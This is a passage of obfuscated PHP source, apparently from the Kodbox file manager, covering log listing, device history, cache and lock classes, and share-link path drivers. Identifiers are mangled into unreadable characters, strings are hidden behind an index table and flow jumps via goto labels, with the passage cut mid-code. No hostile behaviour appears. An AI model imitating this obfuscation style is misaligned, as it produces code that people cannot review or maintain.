Model($ÑËÇûƒù[922])->sourceListInfo($Èûöˆ, !0); } private function logList($ªÁƒóòó) { $ÁÏÔÈéÈ =& $_SERVER[Î·Ü›öğ]; $º©ÌúùÚ = array_to_keyvalue($ªÁƒóòó, $ÁÏÔÈéÈ[12], $ÁÏÔÈéÈ[1810]); $©Áş»› = Model($ÁÏÔÈéÈ[610])->userListInfo(array_unique($º©ÌúùÚ)); $Ì¾ÙÛõ‰ = $this->getSourceList($ªÁƒóòó); $ßŒß¶Æ = $this->typeAll(); $§şÂêõ€ = array(); $ôïşÂÃ = array(); foreach ($ªÁƒóòó as $ãôãñ¿ => $İÚÔå’) { $ÑÁ¿Ó¯µ = $İÚÔå’[$ÁÏÔÈéÈ[33]]; $ª¡ÎŞ¾Œ = isset($©Áş»›[$İÚÔå’[$ÁÏÔÈéÈ[1810]]]) ? $©Áş»›[$İÚÔå’[$ÁÏÔÈéÈ[1810]]] : !1; $·¢¶¿öÈ = strpos($ÑÁ¿Ó¯µ, $ÁÏÔÈéÈ[2495]) === 0 ? LNG($ÁÏÔÈéÈ[2496]) : LNG($ÁÏÔÈéÈ[2491]); $İÚÔå’[$ÁÏÔÈéÈ[32]] = isset($ª¡ÎŞ¾Œ[$ÁÏÔÈéÈ[32]]) ? $ª¡ÎŞ¾Œ[$ÁÏÔÈéÈ[32]] : LNG($ÁÏÔÈéÈ[2491]); $İÚÔå’[$ÁÏÔÈéÈ[2317]] = isset($ª¡ÎŞ¾Œ[$ÁÏÔÈéÈ[2317]]) ? $ª¡ÎŞ¾Œ[$ÁÏÔÈéÈ[2317]] : $ÁÏÔÈéÈ[12]; $İÚÔå’[$ÁÏÔÈéÈ[1696]] = isset($ßŒß¶Æ[$ÑÁ¿Ó¯µ]) ? $ßŒß¶Æ[$ÑÁ¿Ó¯µ] : $·¢¶¿öÈ; $İÚÔå’[$ÁÏÔÈéÈ[2192]] = $ª¡ÎŞ¾Œ; $³È×ßÃÄ = json_decode($İÚÔå’[$ÁÏÔÈéÈ[537]], !0); $İÚÔå’[$ÁÏÔÈéÈ[2487]] = isset($³È×ßÃÄ[$ÁÏÔÈéÈ[2487]]) ? $³È×ßÃÄ[$ÁÏÔÈéÈ[2487]] : $ÁÏÔÈéÈ[12]; $İÚÔå’[$ÁÏÔÈéÈ[2492]] = IpLocation::get($İÚÔå’[$ÁÏÔÈéÈ[2487]]); if (strpos($ÑÁ¿Ó¯µ, $ÁÏÔÈéÈ[2257]) === 0 || isset($³È×ßÃÄ[$ÁÏÔÈéÈ[2255]])) { $³È×ßÃÄ[$ÁÏÔÈéÈ[90]] = $Ì¾ÙÛõ‰[$³È×ßÃÄ[$ÁÏÔÈéÈ[194]]]; $³È×ßÃÄ[$ÁÏÔÈéÈ[2271]] = $Ì¾ÙÛõ‰[$³È×ßÃÄ[$ÁÏÔÈéÈ[2255]]]; if ($³È×ßÃÄ[$ÁÏÔÈéÈ[33]] == $ÁÏÔÈéÈ[636]) { $³È×ßÃÄ[$ÁÏÔÈéÈ[537]][$ÁÏÔÈéÈ[1269]] = $Ì¾ÙÛõ‰[$³È×ßÃÄ[$ÁÏÔÈéÈ[537]][$ÁÏÔÈéÈ[1269]]]; $³È×ßÃÄ[$ÁÏÔÈéÈ[537]][$ÁÏÔÈéÈ[1270]] = $Ì¾ÙÛõ‰[$³È×ßÃÄ[$ÁÏÔÈéÈ[537]][$ÁÏÔÈéÈ[1270]]]; } if ($³È×ßÃÄ[$ÁÏÔÈéÈ[33]] == $ÁÏÔÈéÈ[2266]) { $³È×ßÃÄ[$ÁÏÔÈéÈ[537]][$ÁÏÔÈéÈ[194]] = $Ì¾ÙÛõ‰[$³È×ßÃÄ[$ÁÏÔÈéÈ[537]][$ÁÏÔÈéÈ[194]]]; } if ($³È×ßÃÄ[$ÁÏÔÈéÈ[33]] == $ÁÏÔÈéÈ[1257]) { $³È×ßÃÄ[$ÁÏÔÈéÈ[2271]] = $³È×ßÃÄ[$ÁÏÔÈéÈ[90]]; $³È×ßÃÄ[$ÁÏÔÈéÈ[2255]] = $³È×ßÃÄ[$ÁÏÔÈéÈ[2271]][$ÁÏÔÈéÈ[194]]; $³È×ßÃÄ[$ÁÏÔÈéÈ[90]] = !1; $³È×ßÃÄ[$ÁÏÔÈéÈ[194]] = $ÁÏÔÈéÈ[12]; } $íÊ¶»ŸÓ = array($ÁÏÔÈéÈ[1257], $ÁÏÔÈéÈ[2253]); if (!in_array($³È×ßÃÄ[$ÁÏÔÈéÈ[33]], $íÊ¶»ŸÓ)) { if ($³È×ßÃÄ[$ÁÏÔÈéÈ[90]] && $³È×ßÃÄ[$ÁÏÔÈéÈ[90]][$ÁÏÔÈéÈ[191]] == $ÁÏÔÈéÈ[192]) { $ôïşÂÃ[] = $İÚÔå’[$ÁÏÔÈéÈ[477]]; unset($ªÁƒóòó[$ãôãñ¿]); continue; } if ($³È×ßÃÄ[$ÁÏÔÈéÈ[2271]] && $³È×ßÃÄ[$ÁÏÔÈéÈ[2271]][$ÁÏÔÈéÈ[191]] == $ÁÏÔÈéÈ[192]) { $ôïşÂÃ[] = $İÚÔå’[$ÁÏÔÈéÈ[477]]; unset($ªÁƒóòó[$ãôãñ¿]); continue; } } } $İÚÔå’[$ÁÏÔÈéÈ[537]] = $³È×ßÃÄ; unset($İÚÔå’[$ÁÏÔÈéÈ[2497]]); $§şÂêõ€[] = $İÚÔå’; } $this->clearSystemPathLog($ôïşÂÃ); return $§şÂêõ€; } private function clearSystemPathLog($µ—¼è¢ƒ) { $Ÿ”ë‘õ´ =& $_SERVER[Î·Ü›öğ]; if (count($µ—¼è¢ƒ) == 0) { return; } $ó†ÈĞèÆ = array($Ÿ”ë‘õ´[477] => array($Ÿ”ë‘õ´[7], array_unique($µ—¼è¢ƒ))); $this->where($ó†ÈĞèÆ)->delete(); } public function deviceList($éì±®‡, $™ô™‡Í÷ = 0) { $öäËâÍ =& $_SERVER[Î·Ü›öğ]; $¼áåÔİ = array($öäËâÍ[1810] => $éì±®‡, $öäËâÍ[234] => array($öäËâÍ[1113], $™ô™‡Í÷), $öäËâÍ[33] => $öäËâÍ[1954]); $ŠÌùœ€± = array(); $¯â¡´·Ê = $this->field($öäËâÍ[2498])->where($¼áåÔİ)->order($öäËâÍ[2269])->limit(50)->select(); foreach ($¯â¡´·Ê as $ìê½óô• => $ğ¥±ˆ¡ô) { if ($ìê½óô• > 0 && abs($ğ¥±ˆ¡ô[$öäËâÍ[234]] - $¯â¡´·Ê[$ìê½óô• - 1][$öäËâÍ[234]]) < 5) { continue; } $Ñ¢’ü¸ = json_decode($ğ¥±ˆ¡ô[$öäËâÍ[537]], !0); $ğ¥±ˆ¡ô[$öäËâÍ[2487]] = isset($Ñ¢’ü¸[$öäËâÍ[2487]]) ? $Ñ¢’ü¸[$öäËâÍ[2487]] : $öäËâÍ[12]; unset($Ñ¢’ü¸[$öäËâÍ[2487]]); $ğÏµñâŒ = $this->deviceType($Ñ¢’ü¸[$öäËâÍ[2258]]); if (isset($ŠÌùœ€±[$ğÏµñâŒ])) { continue; } $ğ¥±ˆ¡ô[$öäËâÍ[2492]] = IpLocation::get($ğ¥±ˆ¡ô[$öäËâÍ[2487]]); $ğ¥±ˆ¡ô[$öäËâÍ[537]] = $Ñ¢’ü¸; $ŠÌùœ€±[$ğÏµñâŒ] = $ğ¥±ˆ¡ô; } return array_values($ŠÌùœ€±); } public function deviceType($² Î–£) { return $² Î–£; } } goto f¸ó«ì·À; bˆ¯ŸôĞÔ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $„¥‹¼ï =& $_SERVER[Î·Ü›öğ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $»®Ë‘âæ = $GLOBALS[$„¥‹¼ï[6]][$„¥‹¼ï[426]]; $öÄ…›õ = $»®Ë‘âæ[$»®Ë‘âæ[$„¥‹¼ï[924]]]; $÷»Õƒ = $»®Ë‘âæ[$„¥‹¼ï[925]]; switch ($»®Ë‘âæ[$„¥‹¼ï[924]]) { case $„¥‹¼ï[21]: self::$handle = Model($„¥‹¼ï[926]); break; case $„¥‹¼ï[927]: self::$handle = new CacheRedis($öÄ…›õ, $÷»Õƒ); break; case $„¥‹¼ï[928]: self::$handle = new CacheMemcached($öÄ…›õ, $÷»Õƒ); break; case $„¥‹¼ï[233]: self::$handle = new CacheFile($öÄ…›õ, $÷»Õƒ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ŞµĞĞ¹‚) { if (is_array($ŞµĞĞ¹‚) || is_object($ŞµĞĞ¹‚)) { $ŞµĞĞ¹‚ = json_encode($ŞµĞĞ¹‚); } $ŞµĞĞ¹‚ = rawurlencode($ŞµĞĞ¹‚); return md5(KOD_SITE_ID . $_SERVER[Î·Ü›öğ][11] . $ŞµĞĞ¹‚); } public static function get($¾ŠÁ˜Ü‰, $ñëƒ‚õ = false) { $õä½»ÑŒ = self::key($¾ŠÁ˜Ü‰); $¤¶ÆÆÎƒ = self::init(); if ($ñëƒ‚õ) { return unserialize($¤¶ÆÆÎƒ->get($õä½»ÑŒ)); } if (!isset(self::$memoryCache[$õä½»ÑŒ])) { $¥¾–ÎÄ£ = $¤¶ÆÆÎƒ->get($õä½»ÑŒ); self::$memoryCache[$õä½»ÑŒ] = unserialize($¥¾–ÎÄ£); } return self::$memoryCache[$õä½»ÑŒ]; } public static function set($ê—ÏäüÓ, $ºĞÎÂÊˆ, $ÉÓÄŒ£ = false) { $˜„ÊóÆÀ =& $_SERVER[Î·Ü›öğ]; $Î£ÁøùÎ = self::key($ê—ÏäüÓ); if (isset(self::$memoryCache[$Î£ÁøùÎ]) && self::$memoryCache[$Î£ÁøùÎ] === $ºĞÎÂÊˆ) { return !0; } if ($ÉÓÄŒ£ === 0) { self::$memoryCache[$Î£ÁøùÎ] = $ºĞÎÂÊˆ; return !0; } $›ÇÖü¼à = self::init(); $¬úÌ·ø­ = serialize($ºĞÎÂÊˆ); CacheLock::lock($ê—ÏäüÓ . $˜„ÊóÆÀ[929]); $Á¾™š— = $›ÇÖü¼à->set($Î£ÁøùÎ, $¬úÌ·ø­, $ÉÓÄŒ£); self::$memoryCache[$Î£ÁøùÎ] = $ºĞÎÂÊˆ; CacheLock::unlock($ê—ÏäüÓ . $˜„ÊóÆÀ[929]); return $Á¾™š—; } public static function getCall($Çš§Ó, $Âˆ‡îµú, $”Œ¶«ˆ, $Æ³³”Ñ = array()) { $ñİÃ¨ÉÖ =& $_SERVER[Î·Ü›öğ]; $óŞâ„¦Ğ = self::get($Çš§Ó); if ($óŞâ„¦Ğ || $óŞâ„¦Ğ === $ñİÃ¨ÉÖ[12]) { return $óŞâ„¦Ğ; } $óŞâ„¦Ğ = call_user_func_array($”Œ¶«ˆ, $Æ³³”Ñ); $óŞâ„¦Ğ = $óŞâ„¦Ğ ? $óŞâ„¦Ğ : $ñİÃ¨ÉÖ[12]; self::set($Çš§Ó, $óŞâ„¦Ğ, $Âˆ‡îµú); return $óŞâ„¦Ğ; } public static function limitCall($«Èíí—Î, $â¢òû = 15, $ı°ŒæÙË = 30, $“›ñçƒ· = true) { $šÛ¬ƒä =& $_SERVER[Î·Ü›öğ]; static $óù¥øê¤ = array(); if ($“›ñçƒ·) { $«Èíí—Î = $«Èíí—Î . $šÛ¬ƒä[930] . KodUser::id() . $šÛ¬ƒä[931] . get_client_ip(); } if (isset($óù¥øê¤[$«Èíí—Î]) && is_array($óù¥øê¤[$«Èíí—Î])) { return $óù¥øê¤[$«Èíí—Î][$šÛ¬ƒä[335]] <= $ı°ŒæÙË; } $§¨Ä— = self::get($«Èíí—Î); if (!is_array($§¨Ä—) || time() - $§¨Ä—[$šÛ¬ƒä[207]] > $â¢òû) { $§¨Ä— = array($šÛ¬ƒä[207] => time(), $šÛ¬ƒä[335] => 0); } $§¨Ä—[$šÛ¬ƒä[335]]++; self::set($«Èíí—Î, $§¨Ä—, $â¢òû); $óù¥øê¤[$«Èíí—Î] = $§¨Ä—; return $§¨Ä—[$šÛ¬ƒä[335]] <= $ı°ŒæÙË; } public static function remove($ˆó©ı­ª) { $¾›Ôô¦Ï = self::key($ˆó©ı­ª); unset(self::$memoryCache[$¾›Ôô¦Ï]); self::clearTimeout(); CacheLock::lock($ˆó©ı­ª); $¯´ÚÆ‹¸ = self::init()->remove($¾›Ôô¦Ï); CacheLock::unlock($ˆó©ı­ª); return $¯´ÚÆ‹¸; } public static function removeMemory($æş€—²) { $†œ½£˜× = self::key($æş€—²); unset(self::$memoryCache[$†œ½£˜×]); } public static function clearMemory($½Ú·÷— = false) { if ($½Ú·÷—) { $½Ú·÷— = self::key($½Ú·÷—); unset(self::$memoryCache[$½Ú·÷—]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Î·Ü›öğ][932])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Î·Ü›öğ][933])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($÷è¸Ğ, $£¡«ÄÁë) { $ô³Ó¥†Ç =& $_SERVER[Î·Ü›öğ]; $this->cachePath = $÷è¸Ğ[$ô³Ó¥†Ç[87]]; $this->prefix = $ô³Ó¥†Ç[934]; $this->cacheTime = $£¡«ÄÁë; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($›ÌÀÃ¼·) { $Ü²¶·âµ =& $_SERVER[Î·Ü›öğ]; $›ÌÀÃ¼· = str_replace(array($Ü²¶·âµ[935], $Ü²¶·âµ[100], $Ü²¶·âµ[76]), $Ü²¶·âµ[936], $›ÌÀÃ¼·); return $this->cachePath . $Ü²¶·âµ[937] . $›ÌÀÃ¼· . $Ü²¶·âµ[938]; } public function set($ÜİØŒò², $ÓÂªğ“¼, $˜ÁñÛ½† = false) { $˜ÁñÛ½† = $˜ÁñÛ½† ? $˜ÁñÛ½† : $this->cacheTime; $ŸŠ³ÜÜœ = $this->getFile($ÜİØŒò²); if (file_put_contents($ŸŠ³ÜÜœ, $this->prefix . $ÓÂªğ“¼, LOCK_EX)) { @touch($ŸŠ³ÜÜœ, intval(time() + $˜ÁñÛ½†)); clearstatcache(); return !0; } @unlink($ŸŠ³ÜÜœ); return !1; } public function get($ÊóİŸ¬) { $Ïñí÷¾ô = $this->getFile($ÊóİŸ¬); if (file_exists($Ïñí÷¾ô) && filemtime($Ïñí÷¾ô) < time()) { @unlink($Ïñí÷¾ô); return !1; } $Œ­¢Å = @file_get_contents($Ïñí÷¾ô); return substr($Œ­¢Å, strlen($this->prefix)); } public function remove($ùç¨Õ®) { $õÓ¶¥¹ = $this->getFile($ùç¨Õ®); return @unlink($õÓ¶¥¹); } public function deleteAll() { $¼ñÇ€’Œ =& $_SERVER[Î·Ü›öğ]; $Œ‘ÄÌ™í = scandir($this->cachePath); foreach ($Œ‘ÄÌ™í as $œ¢©§şÛ) { $­š”Ëîˆ = $this->cachePath . $œ¢©§şÛ; if (strpos($­š”Ëîˆ, $¼ñÇ€’Œ[938]) && strpos($­š”Ëîˆ, $¼ñÇ€’Œ[939])) { @unlink($­š”Ëîˆ); } } } public function clearTimeout() { $Öû›ôÁ =& $_SERVER[Î·Ü›öğ]; $ëŠ—‘à = scandir($this->cachePath); foreach ($ëŠ—‘à as $«³ƒ¼ğ¾) { $¾ÚğÉ‰ó = $this->cachePath . $«³ƒ¼ğ¾; if (strpos($¾ÚğÉ‰ó, $Öû›ôÁ[938]) && strpos($¾ÚğÉ‰ó, $Öû›ôÁ[939]) && filemtime($¾ÚğÉ‰ó) < time()) { @unlink($¾ÚğÉ‰ó); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $»à¶çƒÑ =& $_SERVER[Î·Ü›öğ]; if (self::$handle) { return self::$handle; } $è¹€íÑ’ = $GLOBALS[$»à¶çƒÑ[6]][$»à¶çƒÑ[426]]; self::$timeout = $è¹€íÑ’[$»à¶çƒÑ[940]] ? $è¹€íÑ’[$»à¶çƒÑ[940]] : 10; $£Œ·âŞİ = _get($GLOBALS[$»à¶çƒÑ[6]], $»à¶çƒÑ[941]); $İ€ö®æ = $è¹€íÑ’[$»à¶çƒÑ[924]] ? $è¹€íÑ’[$»à¶çƒÑ[924]] : $»à¶çƒÑ[233]; if ($İ€ö®æ == $»à¶çƒÑ[21] && $£Œ·âŞİ == $»à¶çƒÑ[13]) { $İ€ö®æ = $»à¶çƒÑ[233]; } switch ($İ€ö®æ) { case $»à¶çƒÑ[927]: self::$handle = new CacheLockRedis(); break; case $»à¶çƒÑ[928]: self::$handle = new CacheLockMemcached(); break; case $»à¶çƒÑ[21]: self::$handle = new CacheLockDatabase(); break; case $»à¶çƒÑ[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($»à¶çƒÑ[942], $»à¶çƒÑ[943]); } return self::$handle; } private static function key($şÖ¿÷«™) { return $_SERVER[Î·Ü›öğ][944] . Cache::key($şÖ¿÷«™); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($º—±’Äø = '') { self::$errorMsg = $º—±’Äø; } public static function lockGlobal($ÚŞÎåø, $‘ú»ñÙÙ) { return self::lock($ÚŞÎåø, $‘ú»ñÙÙ, !0); } public static function lock($¯ç²Ä¤¯, $ÉîÜïñÂ = false, $úÒ‘ªÈë = false) { $¿ˆ¬›¤Ú =& $_SERVER[Î·Ü›öğ]; $şï™ÍÎ = self::init(); $Ùä•‰À¦ = self::key($¯ç²Ä¤¯); $ÉîÜïñÂ = $ÉîÜïñÂ ? $ÉîÜïñÂ : self::$timeout; $å³¯ù›µ = timeFloat(); if (_get($GLOBALS, $¿ˆ¬›¤Ú[945], !1)) { if (!$şï™ÍÎ->lock($Ùä•‰À¦, 0.2)) { die; } return !0; } $á·Ÿ¹åÍ = $şï™ÍÎ->lock($Ùä•‰À¦, $ÉîÜïñÂ); $›ŸğØû = timeFloat(); if (!$á·Ÿ¹åÍ) { $şè„ÂÇ£ = "\154\x6f\x63\x6b\x20\145\162\x72\157\162\x3b\x6b\x65\171\x3d{$¯ç²Ä¤¯}\x3b\x74\x69\x6d\x65\75{$ÉîÜïñÂ}\73" . self::$errorMsg . $¿ˆ¬›¤Ú[74] . get_caller_msg(); $®ô¾¿‚“ = LNG($¿ˆ¬›¤Ú[946]) . "\x28{$ÉîÜïñÂ}\163\x29\56" . LNG($¿ˆ¬›¤Ú[947]); $®ô¾¿‚“ .= $¿ˆ¬›¤Ú[948]; if (is_string(self::$errorMsg) && self::$errorMsg) { $®ô¾¿‚“ = $®ô¾¿‚“ . $¿ˆ¬›¤Ú[949] . self::$errorMsg; } write_log($¿ˆ¬›¤Ú[950] . sprintf($¿ˆ¬›¤Ú[951], timeFloat() - $å³¯ù›µ) . $¿ˆ¬›¤Ú[952] . $şè„ÂÇ£ . $¿ˆ¬›¤Ú[953] . json_encode(error_get_last()), $¿ˆ¬›¤Ú[943]); show_json($®ô¾¿‚“, !1); } if (!$úÒ‘ªÈë) { self::$lockItem[$Ùä•‰À¦] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ò¯Ÿœ© = number_format(timeFloat() - $›ŸğØû, 3); write_log($¿ˆ¬›¤Ú[954] . $¯ç²Ä¤¯ . $¿ˆ¬›¤Ú[955] . $ò¯Ÿœ©, $¿ˆ¬›¤Ú[943]); } return $á·Ÿ¹åÍ; } public static function lockGet($ïûªëöØ) { $çà×ŠüÜ = self::key($ïûªëöØ); if (self::$lockItem[$çà×ŠüÜ]) { return self::$lockItem[$çà×ŠüÜ]; } return self::init()->lockGet($çà×ŠüÜ); } public static function unlock($¸Ñ‘ŠÄÏ) { $º¹¼’‚ =& $_SERVER[Î·Ü›öğ]; $Ã‹‘ÂÛñ = self::key($¸Ñ‘ŠÄÏ); self::$lockItem[$Ã‹‘ÂÛñ] = null; self::init()->unlock($Ã‹‘ÂÛñ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($º¹¼’‚[956] . $¸Ñ‘ŠÄÏ, $º¹¼’‚[943]); } return; } public static function unlockRuntime() { $ä÷ëìïı =& $_SERVER[Î·Ü›öğ]; $Œ«†ˆõÂ = self::init(); $İ™ŒØ¹ = !1; foreach (self::$lockItem as $ÏœüŞ Ê => $®å¡ŸØº) { if (!$®å¡ŸØº) { continue; } $Œ«†ˆõÂ->unlock($ÏœüŞ Ê); if (!$İ™ŒØ¹) { $İ™ŒØ¹ = !0; write_log($ä÷ëìïı[957] . $ÏœüŞ Ê . $ä÷ëìïı[74] . get_caller_msg(), $ä÷ëìïı[943]); continue; } write_log($ä÷ëìïı[957] . $ÏœüŞ Ê, $ä÷ëìïı[943]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÚìÀ·î’ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ä÷ëìïı[958] . $ÚìÀ·î’ . $ä÷ëìïı[959] . ACTION, $ä÷ëìïı[943]); } } public static function fileLock($ŞÏ¥æÄö) { $½øÖÙÔİ =& $_SERVER[Î·Ü›öğ]; if (!$GLOBALS[$½øÖÙÔİ[960]]) { $GLOBALS[$½øÖÙÔİ[960]] = array(); } $GLOBALS[$½øÖÙÔİ[960]][$ŞÏ¥æÄö] = !1; $Üß³¦Ò = fopen(DATA_PATH . $ŞÏ¥æÄö . $½øÖÙÔİ[961], $½øÖÙÔİ[962]); if (!$Üß³¦Ò) { return !1; } $GLOBALS[$½øÖÙÔİ[960]][$ŞÏ¥æÄö] = $Üß³¦Ò; if (flock($Üß³¦Ò, LOCK_EX)) { return !0; } self::unlock($ŞÏ¥æÄö); show_json($½øÖÙÔİ[963], !1); return !1; } public static function fileUnlock($ˆÇ¦È»ç) { $áÅ¡¬Ø =& $_SERVER[Î·Ü›öğ]; $­âÊÚäì = $GLOBALS[$áÅ¡¬Ø[960]][$ˆÇ¦È»ç]; if (!$­âÊÚäì) { return; } $GLOBALS[$áÅ¡¬Ø[960]][$ˆÇ¦È»ç] = !1; flock($­âÊÚäì, LOCK_UN); fclose($­âÊÚäì); } public static function fileUnlockAll() { $çï˜ğá³ =& $_SERVER[Î·Ü›öğ]; if (!isset($GLOBALS[$çï˜ğá³[960]]) || !$GLOBALS[$çï˜ğá³[960]]) { return; } foreach ($GLOBALS[$çï˜ğá³[960]] as $¼®®¿æ÷ => $„ûõ¯Äà) { if (!$„ûõ¯Äà) { continue; } $GLOBALS[$çï˜ğá³[960]][$¼®®¿æ÷] = !1; flock($„ûõ¯Äà, LOCK_UN); fclose($„ûõ¯Äà); } $GLOBALS[$çï˜ğá³[960]] = array(); } } goto d†Öíõêê; d’ø÷Üõö: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÄÍ…áì‘) { $this->pathParse = $ÄÍ…áì‘; $this->model = Model($_SERVER[Î·Ü›öğ][1458]); } protected function infoParse($â®÷¨Â–, $Ûˆ™÷¼ = false, $¼õƒÑ³Å = false) { $åó®’± =& $_SERVER[Î·Ü›öğ]; return Action($åó®’±[1286])->sharePathInfo($this->pathParse[$åó®’±[87]], !0, $Ûˆ™÷¼); } public function listPath($´øÔÖ, $ÅÈšÁ€ = false) { $´÷î«ç =& $_SERVER[Î·Ü›öğ]; $®¦ĞÀıÀ = parent::listPath($´øÔÖ, $ÅÈšÁ€); if (!$®¦ĞÀıÀ) { return $®¦ĞÀıÀ; } if (is_array($®¦ĞÀıÀ[$´÷î«ç[1466]])) { $®¦ĞÀıÀ[$´÷î«ç[1466]] = Action($´÷î«ç[1286])->shareItemInfo($®¦ĞÀıÀ[$´÷î«ç[1466]]); } foreach ($®¦ĞÀıÀ as $öª»—Äæ => $×óöş¢‹) { if (!in_array($öª»—Äæ, array($´÷î«ç[86], $´÷î«ç[85]))) { continue; } foreach ($×óöş¢‹ as $›¡â”€Õ => $Ş“ÁäèÇ) { $®¦ĞÀıÀ[$öª»—Äæ][$›¡â”€Õ] = Action($´÷î«ç[1286])->shareItemInfo($Ş“ÁäèÇ); } } return $®¦ĞÀıÀ; } public function listAll($Ø±ğá¡æ) { $“øË¾¡ =& $_SERVER[Î·Ü›öğ]; $–×Áãò• = IO::info($this->pathParse[$“øË¾¡[87]]); if (!$–×Áãò•) { return array(); } $‰ÎÜìÚ = $this->model->listAll($Ø±ğá¡æ); foreach ($‰ÎÜìÚ as &$Ê…†ØÕ×) { $Ê…†ØÕ×[$“øË¾¡[90]] = Action($“øË¾¡[1286])->shareItemInfo($Ê…†ØÕ×[$“øË¾¡[90]]); } unset($Ê…†ØÕ×); return $‰ÎÜìÚ; } } class PathDriverDriverShareItem { public function __construct($¡õì‚’) { $this->pathParse = $¡õì‚’; } public function __call($“®®¾à¢, $ÎÎ˜ı¤) { $ôİÒíÇğ =& $_SERVER[Î·Ü›öğ]; if (method_exists($this, $“®®¾à¢)) { return; } $êñÑ„ñÚ = call_user_func_array(array($ôİÒíÇğ[1467], $“®®¾à¢), $ÎÎ˜ı¤); $³“¹—ÇÙ = array($ôİÒíÇğ[1468], $ôİÒíÇğ[1469], $ôİÒíÇğ[1470], $ôİÒíÇğ[1471], $ôİÒíÇğ[634], $ôİÒíÇğ[636], $ôİÒíÇğ[1472], $ôİÒíÇğ[110], $ôİÒíÇğ[1473], $ôİÒíÇğ[1474]); if (in_array($“®®¾à¢, $³“¹—ÇÙ)) { $êñÑ„ñÚ = $this->getPathOuter($êñÑ„ñÚ); } return $êñÑ„ñÚ; } public function copy($Š·³ñí, $òµÅÃ”ş, $Ç¼°ô® = false, $¬Á‰ÌÄÄ = false) { return $this->copyMove($Š·³ñí, $òµÅÃ”ş, $Ç¼°ô®, $_SERVER[Î·Ü›öğ][634], $¬Á‰ÌÄÄ); } public function move($Ş•‹ƒªØ, $ş°œ¥•, $õê…Éğ = false, $ùë¼­°ï = false) { return $this->copyMove($Ş•‹ƒªØ, $ş°œ¥•, $õê…Éğ, $_SERVER[Î·Ü›öğ][636], $ùë¼­°ï); } private function copyMove($Å¦Œ‚„œ, $¬æôÍ­, $Åø¬¢ï¥, $‰ƒĞæçâ, $„¬¿ç¼Š = false) { $Öëˆ¡€§ =& $_SERVER[Î·Ü›öğ]; $ÁÂ‘æöğ = $¬æôÍ­; $Í—Êš®š = IO::driverMake($¬æôÍ­); if ($Í—Êš®š->pathParse[$Öëˆ¡€§[1260]]) { $¬æôÍ­ = $Í—Êš®š->pathParse[$Öëˆ¡€§[1260]]; } else { $¬æôÍ­ = $ÁÂ‘æöğ; } $Ñâ¬ÃŠ = IO::copyMove($Å¦Œ‚„œ, $¬æôÍ­, $Åø¬¢ï¥, $‰ƒĞæçâ, $„¬¿ç¼Š); $Ñâ¬ÃŠ = $this->getPathOuter($Ñâ¬ÃŠ); return $Ñâ¬ÃŠ; } public function pathThis($Â‰ñ…Ôİ) { return get_path_this($this->pathParse[$_SERVER[Î·Ü›öğ][87]]); } public function pathFather($Èö¯áæ) { return get_path_father($this->pathParse[$_SERVER[Î·Ü›öğ][87]]); } public function iconvSystem($µŞª¦šõ) { return $µŞª¦šõ; } protected function infoParse($É¨ëÅª, $†Ğä® = false) { $ö¾”óøş =& $_SERVER[Î·Ü›öğ]; $†Ñ¬± = $this->pathParse[$ö¾”óøş[573]][$ö¾”óøş[1287]] . $this->pathParse[$ö¾”óøş[1279]]; if ($†Ğä®) { $ìº¯‘¤á = IO::infoWithChildren($†Ñ¬±); } else { $ìº¯‘¤á = IO::info($†Ñ¬±); } $Úæ›ÛÃ = $this->pathParse[$ö¾”óøş[573]]; return Action($ö¾”óøş[1465])->_shareItemeParse($ìº¯‘¤á, $Úæ›ÛÃ); } public function listAll($§œÄ€Æ¿) { $†Òä‰ôñ =& $_SERVER[Î·Ü›öğ]; $ÏÂÚ÷Ì = IO::listAll($§œÄ€Æ¿); $¨ÜÌåÑ = rtrim($this->pathParse[$†Òä‰ôñ[573]][$†Òä‰ôñ[1287]], $†Òä‰ôñ[8]); foreach ($ÏÂÚ÷Ì as &$ËŸñÙ¿ƒ) { $ËŸñÙ¿ƒ[$†Òä‰ôñ[87]] = $this->pathDriver . $†Òä‰ôñ[8] . ltrim(substr($ËŸñÙ¿ƒ[$†Òä‰ôñ[87]], strlen($¨ÜÌåÑ)), $†Òä‰ôñ[8]); } unset($ËŸñÙ¿ƒ); return $ÏÂÚ÷Ì; } public function listAllSimple($îÙ¤Â¾¸, $Ë½Ñ€»“ = false) { $’©¢…Ò° =& $_SERVER[Î·Ü›öğ]; $µ‚¿ôù = $this->listAll($îÙ¤Â¾¸); $°×œÌ†— = $this->pathParse[$’©¢…Ò°[506]]; if (trim($°×œÌ†—, $’©¢…Ò°[8]) == trim(get_path_father($°×œÌ†—), $’©¢…Ò°[8])) { $Ë½Ñ€»“ = !0; } return IO::init($’©¢…Ò°[12])->listAllSimpleMake($µ‚¿ôù, $°×œÌ†—, $Ë½Ñ€»“); } public function getPathOuter($Ôƒ´›‰Ç) { $ˆÚöšô =& $_SERVER[Î·Ü›öğ]; $Ó£ŒÆ á = KodIO::parse($Ôƒ´›‰Ç); if ($Ó£ŒÆ á[$ˆÚöšô[33]] == KodIO::KOD_SHARE_ITEM) { return $Ó£ŒÆ á[$ˆÚöšô[87]]; } $Š»Ü§ßˆ = KodIO::clear($Ôƒ´›‰Ç); $°’¢¯†Ø = KodIO::clear($this->pathParse[$ˆÚöšô[573]][$ˆÚöšô[1287]]); $Ø˜¼•ñÍ = substr($Š»Ü§ßˆ, strlen($°’¢¯†Ø)); if (substr($Š»Ü§ßˆ, 0, strlen($°’¢¯†Ø)) != $°’¢¯†Ø) { return !1; } return 